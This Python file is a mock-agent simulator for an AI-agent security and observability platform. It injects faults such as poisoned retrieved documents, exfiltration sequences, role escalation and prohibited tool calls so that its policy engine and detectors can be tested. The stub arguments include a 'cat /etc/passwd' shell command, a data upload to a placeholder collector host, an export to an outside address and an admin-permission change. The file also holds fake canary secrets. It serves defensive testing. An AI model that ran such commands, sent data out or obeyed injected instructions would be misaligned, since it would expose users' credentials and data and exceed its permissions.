"""Deterministic mock agents.

Each agent *simulates* model latency/tokens from its version profile (no paid
API is called) but *really executes* the surrounding agent machinery:
keyword retrieval over the synthetic corpus, JSON-schema-validated sandboxed
tool calls, the policy engine, and the content guards. Latency values are
therefore simulated, while retrieval results, tool results, policy decisions
and security findings are computed by real code.

Fault injection (``Task.faults``) only sets up a situation (a slow tool, a
poisoned document, an attempted disallowed tool, ...). Whether the platform
detects it is decided downstream by the detectors and evaluators.
"""

from __future__ import annotations

import json
import random
import re
from datetime import datetime

from common.config import AgentVersion
from common.ids import span_id as new_span_id
from generator.agents.base import ExecutionResult, SpanRecord, Task, ToolCallRecord
from generator.agents.corpus import DOC_BY_ID, DOCUMENTS, ORDER_STATUSES, QA_BANK, tokenize
from generator.agents.tools import TOOLS, ToolError, execute_tool
from security.detectors import Action, detect_exfiltration, find_prompt_injection, find_sensitive_data, redact_text
from security.policy_engine import PolicyEngine

DIFFICULTY = {"easy": (0.85, 0.05), "medium": (1.0, 0.0), "hard": (1.3, -0.12)}  # (cost factor, accuracy delta)
TOOL_TIMEOUT_MS = 8000.0
MAX_RETRIES = 2
SENSITIVE_CLASSES = frozenset({"confidential", "restricted"})
INDEXED_CLASSES = frozenset({"public", "internal"})  # restricted/confidential docs are not in the retrieval index
UNALLOWED_CANDIDATES = ("send_external_email", "http_post", "read_resource", "get_order_status", "create_ticket", "calculator")
PROHIBITED_CANDIDATES = ("execute_shell", "delete_records", "export_data")
CANARY_LEAKS = ("AGSH-CANARY-5F1E9A3B", "AGSH-CANARY-9C2D7E10", "sk-agsh-test-4k9x2m7q1z0p")
_NUM = re.compile(r"\d+")

_STUB_ARGS = {
    "send_external_email": {"to": "partner@example.invalid", "body": "report attached"},
    "http_post": {"url": "https://collector.example.invalid/upload", "body": "payload"},
    "read_resource": {"resource": "hr/salaries"},
    "get_order_status": {"order_id": "ORD-4242"},
    "create_ticket": {"category": "software", "priority": "low", "summary": "follow-up request"},
    "calculator": {"expression": "2+2"},
    "execute_shell": {"command": "cat /etc/passwd"},
    "delete_records": {"table": "customers"},
    "export_data": {"target": "archive@example.invalid"},
    "modify_permissions": {"role": "admin"},
}


def wrong_answer(reference: str, rng: random.Random) -> str:
    if reference in ORDER_STATUSES:
        return rng.choice([s for s in ORDER_STATUSES if s != reference])
    if reference.startswith(("KB-", "HR-")):
        return rng.choice([d.doc_id for d in DOCUMENTS if d.doc_id != reference and d.classification == "public"])
    m = _NUM.search(reference)
    if m:
        n = int(m.group(0))
        delta = rng.choice((-3, -2, -1, 1, 2, 6, 12))
        new = n + delta if n + delta >= 0 else n + abs(delta)
        return reference[: m.start()] + str(new) + reference[m.end():]
    return rng.choice([t.answer for t in QA_BANK if t.answer != reference])


class _Run:
    """Mutable state of one simulated agent run."""

    def __init__(self, task: Task, av: AgentVersion, rng: random.Random, engine: PolicyEngine, load_factor: float):
        self.task, self.av, self.rng, self.engine = task, av, rng, engine
        self.p = dict(av.profile)
        self.mult: dict[str, float] = {}
        for k, v in task.incident_effect.items():
            (self.mult if k.endswith("_multiplier") else self.p)[k] = v
        self.cost_f, self.acc_delta = DIFFICULTY[task.difficulty]
        self.load = load_factor
        self.faults = set(task.faults)
        self.allowed_tools = set(engine.agent_policy(av.agent_id)["allowed_tools"])
        self.spans: list[SpanRecord] = []
        self.t = 0.0
        self.step = 0
        self.violations = []
        self.actions: list[Action] = []
        self.tool_calls: list[ToolCallRecord] = []
        self.retrieved: list[tuple[str, float]] = []
        self.exposed_docs: list[str] = []  # documents whose *content* entered the agent context
        self.in_tok = self.out_tok = self.llm_calls = self.retries = 0
        self.tool_requests = 0
        self.role = engine.expected_role
        self.slow_tool_used = False
        self.timeout_used = False
        self.failed: tuple[str, str] | None = None
        self.root = self.open_container("agent", f"{av.agent_id}.run", parent=None, depth=1)

    # ------------------------------------------------------------------ spans
    def add_span(self, kind: str, name: str, duration: float, parent: str | None = None, depth: int = 2, sid: str | None = None, **kw) -> SpanRecord:
        s = SpanRecord(
            span_id=sid or new_span_id(self.rng),
            parent_span_id=parent if parent is not None else self.root.span_id,
            span_kind=kind,
            span_name=name,
            start_ms=round(self.t, 3),
            duration_ms=round(duration, 3),
            step_index=self.step,
            depth=depth,
            **kw,
        )
        if self.role != self.engine.expected_role:
            s.attributes["runtime_role"] = self.role
        self.spans.append(s)
        self.t += duration + self.rng.uniform(0.3, 2.5)
        self.step += 1
        return s

    def open_container(self, kind: str, name: str, parent: str | None, depth: int, **kw) -> SpanRecord:
        s = SpanRecord(
            span_id=new_span_id(self.rng), parent_span_id=parent, span_kind=kind, span_name=name,
            start_ms=round(self.t, 3), duration_ms=0.0, step_index=self.step, depth=depth, **kw,
        )
        self.spans.append(s)
        self.t += self.rng.uniform(0.5, 2.0)
        self.step += 1
        return s

    def close_container(self, s: SpanRecord) -> None:
        self.t += self.rng.uniform(0.3, 1.5)
        s.duration_ms = round(self.t - s.start_ms, 3)

    # ------------------------------------------------------------------ model
    def llm(self, name: str, in_tok: float, out_tok: float, parent: str | None = None, depth: int = 2, kind: str = "llm_call", scale: float = 1.0) -> SpanRecord:
        p, rng = self.p, self.rng
        lat = p["llm_latency_ms"] * self.cost_f * scale * self.load * rng.lognormvariate(0, p["latency_sigma"])
        lat *= self.mult.get("llm_latency_multiplier", 1.0)
        i = max(1, int(in_tok * self.cost_f * rng.uniform(0.85, 1.15)))
        o = max(1, int(out_tok * self.cost_f * rng.uniform(0.8, 1.2)))
        if "high_token_usage" in self.faults:
            i *= rng.randint(3, 5)
            o = int(o * rng.uniform(6, 10))
            lat *= rng.uniform(2.0, 3.0)
        ttft = lat * p["ttft_ratio"] * rng.uniform(0.8, 1.2)
        s = self.add_span(kind, name, lat, parent, depth, model_name=self.av.model_name, input_tokens=i, output_tokens=o, ttft_ms=round(ttft, 3))
        self.in_tok += i
        self.out_tok += o
        self.llm_calls += 1
        return s

    # ------------------------------------------------------------------ guards
    def input_guard(self, text: str) -> None:
        s = self.add_span("policy_check", "input_guard", self.rng.uniform(1.0, 4.0), policy_decision="allow")
        hits = find_prompt_injection(text)
        if hits:
            s.policy_decision = "flag"
            self.violations.append(
                self.engine.violation("SEC-004", "flagged", f"user input matched indicator /{hits[0]}/",
                                      detector="input_content_guard", span_id=s.span_id)
            )

    def output_guard(self, output_text: str) -> None:
        s = self.add_span("policy_check", "output_guard", self.rng.uniform(1.0, 3.0), policy_decision="allow")
        for name, redacted in find_sensitive_data(output_text):
            s.policy_decision = "flag"
            self.violations.append(
                self.engine.violation("SEC-005", "flagged", f"{name} pattern in output: {redacted}",
                                      detector="output_content_guard", span_id=s.span_id)
            )
        exf = detect_exfiltration(self.actions, self.engine.egress)
        if exf:
            s.policy_decision = "flag"
            self.violations.append(
                self.engine.violation("SEC-007", "flagged", f"sensitive read of {exf[0]} followed by egress tool {exf[1]}",
                                      detector="sequence_detector", span_id=s.span_id, tool_name=exf[1])
            )

    def scan_documents(self, doc_ids: list[str], span: SpanRecord) -> None:
        for doc_id in doc_ids:
            doc = DOC_BY_ID[doc_id]
            self.exposed_docs.append(doc_id)
            hits = find_prompt_injection(doc.text)
            if hits:
                span.policy_decision = "flag"
                self.violations.append(
                    self.engine.violation("SEC-004", "flagged", f"retrieved document {doc_id} matched indicator /{hits[0]}/",
                                          detector="retrieval_content_guard", span_id=span.span_id)
                )
            self.violations.extend(self.engine.check_data_access(self.av.agent_id, doc.classification, doc.resource, doc_id, span.span_id))
            self.actions.append(Action("read", doc_id, doc.classification in SENSITIVE_CLASSES))

    # ------------------------------------------------------------------ retrieval
    def retrieve(self, query: str, relevant: tuple[str, ...], parent: str | None = None, depth: int = 2) -> list[str]:
        p, rng = self.p, self.rng
        k = int(p.get("top_k", 4))
        q = set(tokenize(query))
        score_of: dict[str, float] = {}
        for d in DOCUMENTS:
            if d.classification in INDEXED_CLASSES:
                score_of[d.doc_id] = len(q & d.tokens) / (len(q) or 1) + rng.uniform(0, 0.01)
        ranked = [d for d in sorted(score_of, key=score_of.__getitem__, reverse=True)
                  if score_of[d] >= p.get("min_retrieval_score", 0.05)]
        if rng.random() < p.get("retrieval_noise", 0.0):
            for rel in relevant:
                if rel in ranked:
                    ranked.remove(rel)
                    ranked.insert(min(len(ranked), k + rng.randint(0, 4)), rel)
        lat = p.get("retrieval_latency_ms", 80.0) * rng.lognormvariate(0, 0.25)
        status, err = "ok", None
        if "failed_retrieval" in self.faults:
            lat *= rng.uniform(1.5, 4.0)
            if rng.random() < 0.5:
                status, err, ranked = "error", "retrieval_error", []
            else:
                ranked = [d for d in ranked if d not in relevant]
        if "prompt_injection" in self.faults and status == "ok":
            # Fault definition: a poisoned document ranks at the top of the results (exposure is guaranteed).
            for rel in relevant:
                if DOC_BY_ID[rel].contains_injection:
                    ranked = [rel] + [d for d in ranked if d != rel]
        top = ranked[:k]
        scores = [round(score_of[d], 4) for d in top]
        s = self.add_span("retrieval", "vector_search", lat, parent, depth, status=status, error_category=err,
                          retrieved_doc_ids=top, retrieval_scores=scores, top_k=k, policy_decision="allow")
        self.scan_documents(top, s)
        self.retrieved.extend(zip(top, scores))
        if status == "error":
            self.failed = ("failed", "retrieval_error")
        return top

    # ------------------------------------------------------------------ tools
    def tool(self, name: str, args: dict, parent: str | None = None, depth: int = 2) -> ToolCallRecord:
        rng, p = self.rng, self.p
        sid = new_span_id(rng)
        decision = self.engine.check_tool_call(self.av.agent_id, name, self.tool_requests, span_id=sid)
        self.tool_requests += 1
        lookup_doc = DOC_BY_ID.get(args.get("doc_id", "")) if name == "document_lookup" else None
        if name == "read_resource":
            self.actions.append(Action("read", args.get("resource", "?"), True))
        if self.engine.is_egress(name):
            self.actions.append(Action("tool", name))
        if not decision.allowed:
            s = self.add_span("tool_call", f"tool:{name}", rng.uniform(1.5, 4.0), parent, depth, sid=sid, status="error",
                              error_category="policy_denied", tool_name=name, tool_allowed=False, policy_decision="deny",
                              data_classification=TOOLS[name].data_classification if name in TOOLS else None)
            self.violations.extend(decision.violations)
            rec = ToolCallRecord(name, args, False, "denied", False, s.duration_ms, s.span_id)
            self.tool_calls.append(rec)
            return rec

        valid = not TOOLS[name].validate_args(args)
        timeouts_planned = 0
        if valid and "tool_timeout" in self.faults and not self.timeout_used:
            self.timeout_used = True
            timeouts_planned = rng.choice((1, 2, 3))  # 3 => every attempt times out
        total, status, result, last = 0.0, "error", None, None
        attempt = 0
        for attempt in range(1, MAX_RETRIES + 2):
            lat = p.get("tool_latency_ms", 120.0) * rng.lognormvariate(0, 0.35) * self.mult.get("tool_latency_multiplier", 1.0)
            status, err, result = "ok", None, None
            if not valid:
                status, err, lat = "error", "invalid_tool_args", lat * 0.3
            else:
                if "slow_tool" in self.faults and not self.slow_tool_used:
                    self.slow_tool_used = True
                    lat *= rng.uniform(10.0, 20.0)
                if attempt <= timeouts_planned:
                    status, err, lat = "timeout", "tool_timeout", TOOL_TIMEOUT_MS
                elif rng.random() < p.get("tool_error_rate", 0.0):
                    status, err = "error", "tool_error"
                else:
                    try:
                        result = execute_tool(name, args)
                    except ToolError:
                        status, err = "error", "tool_error"
            classification = lookup_doc.classification if lookup_doc else TOOLS[name].data_classification
            last = self.add_span("tool_call", f"tool:{name}", lat, parent, depth, attempt=attempt, status=status,
                                 error_category=err, tool_name=name, tool_args_valid=valid, tool_allowed=True,
                                 policy_decision="allow", data_classification=classification)
            total += lat
            if status == "ok" or not valid or attempt > MAX_RETRIES:
                break
            self.retries += 1
        rec = ToolCallRecord(name, args, True, status, valid, total, last.span_id, attempt, result)
        self.tool_calls.append(rec)
        if status == "ok" and lookup_doc is not None:
            self.scan_documents([lookup_doc.doc_id], last)
        return rec

    # ------------------------------------------------------------------ security fault set-ups
    def security_actions(self) -> None:
        rng, f = self.rng, self.faults
        if "suspicious_tool_access" in f:
            options = [t for t in UNALLOWED_CANDIDATES if t not in self.allowed_tools and t not in self.engine.prohibited]
            t = rng.choice(options)
            self.tool(t, dict(_STUB_ARGS[t]))
        if "policy_violation" in f:
            t = rng.choice(PROHIBITED_CANDIDATES)
            self.tool(t, dict(_STUB_ARGS[t]))
        if "prompt_injection" in f and rng.random() < 0.4:
            # A vulnerable agent tries to follow the injected instruction; the policy engine denies it.
            self.tool("export_data", dict(_STUB_ARGS["export_data"]))
        if "exfiltration_sequence" in f or ("sensitive_data_leak" in f and "document_lookup" in self.allowed_tools):
            if "document_lookup" in self.allowed_tools:
                self.tool("document_lookup", {"doc_id": rng.choice(("HR-001", "FIN-001", "SEC-001"))})
            elif "exfiltration_sequence" in f:
                self.tool("read_resource", {"resource": rng.choice(sorted(self.engine.restricted_resources))})
        if "exfiltration_sequence" in f:
            t = rng.choice(("send_external_email", "http_post"))
            self.tool(t, dict(_STUB_ARGS[t]))
        if "privilege_escalation" in f:
            previous = self.role
            self.role = rng.choice(sorted(self.engine.elevated_roles))
            s = self.add_span("policy_check", "role_monitor", rng.uniform(1.0, 2.0), policy_decision="flag",
                              attributes={"previous_role": previous})
            self.violations.extend(self.engine.check_role(self.role, s.span_id))
            if rng.random() < 0.5:
                self.tool("modify_permissions", dict(_STUB_ARGS["modify_permissions"]))

    # ------------------------------------------------------------------ output
    def compose_output(self, correct: bool, citations: list[str] | None, parent: str | None = None) -> tuple[str | None, str]:
        rng, task = self.rng, self.task
        answer = task.reference_answer if correct else wrong_answer(task.reference_answer, rng)
        if "sensitive_data_leak" in self.faults:
            answer = f"(ref {rng.choice(CANARY_LEAKS)}) {answer}"
        obj: dict = {"answer": answer, "confidence": round(rng.uniform(0.6, 0.98) if correct else rng.uniform(0.3, 0.9), 2)}
        if citations is not None:
            obj["citations"] = citations
        text = json.dumps(obj)
        injected = "malformed_response" in self.faults
        malformed = injected or rng.random() > self.p.get("json_validity", 1.0)
        if malformed:
            # Output fails schema validation; the agent re-asks the model once.
            self.retries += 1
            self.llm("repair_output", 120, self.p["output_tokens"] * 0.6, parent=parent)
            malformed = rng.random() < (0.6 if injected else 0.3)
        if malformed:
            text = text[: -rng.randint(2, min(15, len(text) - 1))]  # cut-off tail -> invalid JSON
            self.failed = self.failed or ("failed", "malformed_response")
        return answer, text

    def finish(self, start: datetime, output_text: str, answer: str | None, citations: list[str], final_llm: SpanRecord | None, capture: bool) -> ExecutionResult:
        self.output_guard(output_text)
        self.close_container(self.root)
        status, err = self.failed or ("completed", None)
        self.root.status = {"completed": "ok", "failed": "error", "timeout": "timeout"}[status]
        self.root.error_category = err
        if capture:
            self.root.attributes["input_preview"] = redact_text(self.task.user_input)[:160]
            self.root.attributes["output_preview"] = redact_text(output_text)[:160]
        ttft = round(final_llm.start_ms + (final_llm.ttft_ms or 0.0), 3) if final_llm else None
        return ExecutionResult(
            start=start, spans=self.spans, status=status, error_category=err, output_text=output_text, answer=answer,
            citations=citations, retrieved=self.retrieved, tool_calls=self.tool_calls, violations=self.violations,
            input_tokens=self.in_tok, output_tokens=self.out_tok, llm_calls=self.llm_calls, retries=self.retries,
            ttft_ms=ttft, top_k=int(self.p["top_k"]) if "top_k" in self.p else None, exposed_docs=self.exposed_docs,
        )


class AgentSimulator:
    def __init__(self, engine: PolicyEngine | None = None, capture_content: bool = False):
        self.engine = engine or PolicyEngine()
        self.capture = capture_content

    def run(self, task: Task, av: AgentVersion, rng: random.Random, start: datetime, load_factor: float = 1.0) -> ExecutionResult:
        r = _Run(task, av, rng, self.engine, load_factor)
        r.input_guard(task.user_input)
        handler = {"qa": self._qa, "rag": self._rag, "tool": self._tool, "multi_step": self._multi_step}[av.workload_type]
        return handler(r, start)

    # ------------------------------------------------------------------ workloads
    def _qa(self, r: _Run, start: datetime) -> ExecutionResult:
        r.security_actions()
        final = r.llm("generate_answer", r.p["input_tokens"], r.p["output_tokens"])
        correct = r.rng.random() < r.p["accuracy"] + r.acc_delta
        answer, text = r.compose_output(correct, None)
        return r.finish(start, text, answer, [], final, self.capture)

    def _rag(self, r: _Run, start: datetime) -> ExecutionResult:
        task, rng = r.task, r.rng
        r.llm("rewrite_query", 180, 40, scale=0.25)
        top = r.retrieve(task.user_input, task.relevant_doc_ids)
        if top:
            r.tool("document_lookup", {"doc_id": top[0]})
        r.security_actions()
        hit = any(d in top for d in task.relevant_doc_ids)
        final = r.llm("generate_answer", r.p["input_tokens"], r.p["output_tokens"])
        if not top:
            p_correct = 0.05
        else:
            p_correct = (r.p["accuracy"] + r.acc_delta) if hit else 0.15
        correct = rng.random() < p_correct
        citations: list[str] = []
        if top:
            for d in top[:2]:
                if d in task.relevant_doc_ids and rng.random() < r.p.get("citation_rate", 0.9):
                    citations.append(d)
            if not citations or rng.random() < 0.15:
                citations.append(top[-1])
        answer, text = r.compose_output(correct, citations)
        return r.finish(start, text, answer, citations, final, self.capture)

    def _execute_expected(self, r: _Run, tools: tuple, parent: str | None = None, depth: int = 2, allow_loop: bool = True) -> bool:
        """Run the expected tool plan with mistakes/faults; returns True if every step succeeded with correct args."""
        rng, p = r.rng, r.p
        ok = True
        for idx, (name, args) in enumerate(tools):
            call_name, call_args = name, dict(args)
            if rng.random() < p.get("wrong_tool_rate", 0.0):
                alternatives = sorted(t for t in r.allowed_tools if t not in (name, "delegate_subtask"))
                if alternatives:
                    call_name = rng.choice(alternatives)
                    call_args = dict(_STUB_ARGS.get(call_name, {"query": r.task.user_input[:60]}))
                    if call_name == "search_kb":
                        call_args = {"query": r.task.user_input[:60]}
                    elif call_name == "document_lookup":
                        call_args = {"doc_id": "KB-008"}
            elif rng.random() < p.get("bad_args_rate", 0.0):
                call_args = {k: (v.lower() + "!" if isinstance(v, str) else v) for k, v in call_args.items()}
            rec = r.tool(call_name, call_args, parent, depth)
            if not rec.args_valid and rec.allowed:
                # Re-plan once after an argument validation error.
                r.retries += 1
                r.llm("replan_tool_args", 200, 60, parent, depth, scale=0.4)
                if rng.random() < 0.7:
                    call_name, call_args = name, dict(args)
                    rec = r.tool(call_name, call_args, parent, depth)
            if allow_loop and idx == 0 and "loop" in r.faults:
                for _ in range(rng.randint(6, 11)):
                    r.llm("reflect", 150, 30, parent, depth, scale=0.3)
                    again = r.tool(call_name, call_args, parent, depth)
                    if again.status == "denied":
                        r.failed = ("failed", "tool_budget_exceeded")
                        break
            if name == "search_kb" and rec.status == "ok" and rec.result:
                r.retrieved.extend((d, 1.0) for d in rec.result.get("doc_ids", []))
            if rec.status == "timeout":
                r.failed = r.failed or ("timeout", "tool_timeout")
            elif rec.status != "ok" and rec.allowed:
                r.failed = r.failed or ("failed", "tool_error" if rec.args_valid else "invalid_tool_args")
            step_ok = rec.status == "ok" and call_name == name and call_args == args
            ok = ok and step_ok
            if r.failed:
                break
        return ok

    def _tool(self, r: _Run, start: datetime) -> ExecutionResult:
        r.llm("plan_tool_call", r.p["input_tokens"] * 0.6, 60)
        r.security_actions()
        ok = self._execute_expected(r, r.task.expected_tools)
        final = r.llm("compose_answer", r.p["input_tokens"] * 0.5, r.p["output_tokens"])
        correct = ok and not r.failed and r.rng.random() < r.p["accuracy"] + r.acc_delta + 0.05
        answer, text = r.compose_output(correct, None)
        return r.finish(start, text, answer, [], final, self.capture)

    def _multi_step(self, r: _Run, start: datetime) -> ExecutionResult:
        task, rng = r.task, r.rng
        r.llm("plan", r.p["input_tokens"] * 0.7, 120, kind="planning")
        r.security_actions()
        tools = task.expected_tools
        ok = True
        if r.p.get("delegation") and len(tools) >= 2 and not r.failed:
            # v2: delegate the research half of the plan to a helper sub-agent.
            r.tool("delegate_subtask", {"subagent": "research-subagent", "task": task.user_input[:80]})
            deleg = r.open_container("delegation", "delegate:research-subagent", parent=r.root.span_id, depth=2,
                                     delegated_agent_id="research-subagent")
            r.llm("subagent_reasoning", 400, 80, parent=deleg.span_id, depth=3, scale=0.5)
            ok = self._execute_expected(r, tools[:2], parent=deleg.span_id, depth=3)
            r.close_container(deleg)
            if not r.failed:
                ok = self._execute_expected(r, tools[2:], allow_loop=False) and ok
        else:
            ok = self._execute_expected(r, tools)
        if task.relevant_doc_ids and not r.failed and not r.retrieved:
            r.retrieve(task.user_input, task.relevant_doc_ids)
        final = r.llm("synthesize_answer", r.p["input_tokens"], r.p["output_tokens"])
        p_correct = (r.p["accuracy"] + r.acc_delta) if ok and not r.failed else 0.2
        correct = rng.random() < p_correct
        citations = [d for d in task.relevant_doc_ids if any(d == x for x, _ in r.retrieved)] if task.relevant_doc_ids else []
        answer, text = r.compose_output(correct, citations if task.relevant_doc_ids else None)
        return r.finish(start, text, answer, citations, final, self.capture)
